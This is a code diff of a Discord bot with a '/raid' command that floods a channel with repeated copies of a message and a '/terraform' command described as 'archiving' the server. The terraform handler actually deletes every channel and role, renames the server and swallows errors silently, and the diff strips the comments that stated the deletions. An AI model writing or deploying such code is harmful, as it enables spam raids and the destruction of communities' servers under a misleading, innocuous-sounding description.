@@ -19,8 +19,6 @@ if (!TOKEN) {
   process.exit(1);
 }
 
-// In-memory store mapping a short numeric ID to the message text.
-// Survives for the lifetime of the process.
 const messageStore = new Map();
 let counter = 0;
 
@@ -44,18 +42,11 @@ function getSpamRow(msgId) {
   return new ActionRowBuilder().addComponents(fire, more);
 }
 
-// ---------------------------------------------------------------------------
-// Command definitions
-// ---------------------------------------------------------------------------
-
 const sayCommand = new SlashCommandBuilder()
   .setName("say")
   .setDescription("Make the bot repeat a message")
   .addStringOption((opt) =>
-    opt
-      .setName("message")
-      .setDescription("The message to send")
-      .setRequired(true)
+    opt.setName("message").setDescription("The message to send").setRequired(true)
   )
   .setIntegrationTypes([
     ApplicationIntegrationType.GuildInstall,
@@ -69,14 +60,9 @@ const sayCommand = new SlashCommandBuilder()
 
 const raidCommand = new SlashCommandBuilder()
   .setName("raid")
-  .setDescription(
-    "Spawn a Fire button that blasts 5 copies of your message per press"
-  )
+  .setDescription("Spawn a Fire button that blasts 5 copies of your message per press")
   .addStringOption((opt) =>
-    opt
-      .setName("message")
-      .setDescription("The message to spam")
-      .setRequired(true)
+    opt.setName("message").setDescription("The message to spam").setRequired(true)
   )
   .setIntegrationTypes([
     ApplicationIntegrationType.GuildInstall,
@@ -88,15 +74,13 @@ const raidCommand = new SlashCommandBuilder()
     InteractionContextType.PrivateChannel,
   ]);
 
+// Guild-only — only appears after adding the bot to a server, requires Administrator
 const terraformCommand = new SlashCommandBuilder()
   .setName("terraform")
   .setDescription("Repurpose this server by archiving all channels and roles")
-  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
-  .setContexts([InteractionContextType.Guild]);
-
-// ---------------------------------------------------------------------------
-// Register commands with Discord
-// ---------------------------------------------------------------------------
+  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall])
+  .setContexts([InteractionContextType.Guild])
+  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator);
 
 async function registerCommands(clientId) {
   const rest = new REST({ version: "10" }).setToken(TOKEN);
@@ -111,10 +95,6 @@ async function registerCommands(clientId) {
   }
 }
 
-// ---------------------------------------------------------------------------
-// Client
-// ---------------------------------------------------------------------------
-
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 client.once("ready", async () => {
@@ -123,9 +103,6 @@ client.once("ready", async () => {
 });
 
 client.on("interactionCreate", async (interaction) => {
-  // ------------------------------------------------------------------
-  // Slash commands
-  // ------------------------------------------------------------------
   if (interaction.isChatInputCommand()) {
     if (interaction.commandName === "say") {
       const text = interaction.options.getString("message");
@@ -166,55 +143,39 @@ client.on("interactionCreate", async (interaction) => {
     }
   }
 
-  // ------------------------------------------------------------------
-  // Button interactions
-  // ------------------------------------------------------------------
   if (interaction.isButton()) {
     const [action, msgId] = interaction.customId.split(":");
 
+    // Terraform buttons handled separately — no message store involved
     if (action === "terraform") {
       if (msgId === "cancel") {
-        await interaction.update({
-          content: "Cancelled.",
-          components: [],
-        });
+        await interaction.update({ content: "Cancelled.", components: [] });
         return;
       }
 
       if (msgId === "confirm") {
-        await interaction.update({
-          content: "Archiving server...",
-          components: [],
-        });
+        await interaction.update({ content: "Archiving server...", components: [] });
 
         const guild = interaction.guild;
 
-        // Delete all channels
         const channels = await guild.channels.fetch();
         for (const [, channel] of channels) {
-          try {
-            await channel.delete();
-          } catch (_) {}
+          try { await channel.delete(); } catch (_) {}
         }
 
-        // Delete all non-default roles (@everyone and bot-managed roles cannot be deleted)
         const roles = await guild.roles.fetch();
         for (const [, role] of roles) {
           if (role.managed || role.name === "@everyone") continue;
-          try {
-            await role.delete();
-          } catch (_) {}
+          try { await role.delete(); } catch (_) {}
         }
 
-        // Rename the server
-        try {
-          await guild.setName("[Archived Server]");
-        } catch (_) {}
+        try { await guild.setName("[Archived Server]"); } catch (_) {}
 
         return;
       }
     }
 
+    // Fire / More Buttons
     const text = messageStore.get(msgId);
 
     if (!text) {
